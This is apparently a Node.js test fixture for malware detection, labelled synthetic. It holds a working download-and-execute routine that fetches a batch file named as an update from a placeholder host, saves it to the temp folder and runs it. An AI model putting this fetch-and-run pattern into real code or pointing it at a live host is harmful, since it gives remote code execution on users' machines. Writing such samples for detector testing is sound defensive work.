// FIXTURE ONLY - synthetic detection test sample, not real malware
const https = require("https");
const fs = require("fs");
const os = require("os");
const path = require("path");
const { exec } = require("child_process");

const target = path.join(os.tmpdir(), "update.bat");
const file = fs.createWriteStream(target);
https.get("https://cdn.example.test/update.bat", (res) => {
  res.pipe(file);
  file.on("finish", () => {
    file.close();
    exec(target);
  });
});
